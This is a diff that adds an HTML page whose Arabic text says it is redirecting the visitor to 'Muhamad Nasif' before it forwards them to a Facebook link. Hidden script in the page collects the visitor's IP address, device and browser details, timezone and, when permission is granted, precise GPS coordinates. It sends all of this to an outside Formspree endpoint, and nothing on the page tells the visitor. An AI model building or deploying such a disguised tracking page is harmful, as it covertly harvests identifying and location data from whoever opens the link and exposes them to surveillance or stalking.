@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ تحويلك...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      margin: auto;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>جاري تحويلك إلى Muhamad Nasif...</h2>
+    <p>برجاء الانتظار لحظات قليلة</p>
+  </div>
+
+  <script>
+    async function collectData() {
+      const ipInfo = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      };
+
+      let locationInfo = {};
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          locationInfo = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy + " meters"
+          };
+          sendData();
+        }, sendData); // لو رفض الموقع، نكمل بدون إحداثيات
+      } else {
+        sendData();
+      }
+
+      function sendData() {
+        const fullData = {
+          ip: ipInfo.ip,
+          ...deviceInfo,
+          ...locationInfo,
+          time: new Date().toLocaleString()
+        };
+
+        fetch("https://formspree.io/f/xpzvqrpe", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fullData)
+        });
+      }
+    }
+
+    collectData();
+
+    // تحويل بعد 5 ثواني
+    setTimeout(() => {
+      window.location.href = "https://www.facebook.com/share/16Y4FhGmSw/";
+    }, 5000);
+  </script>
+</body>
+</html>
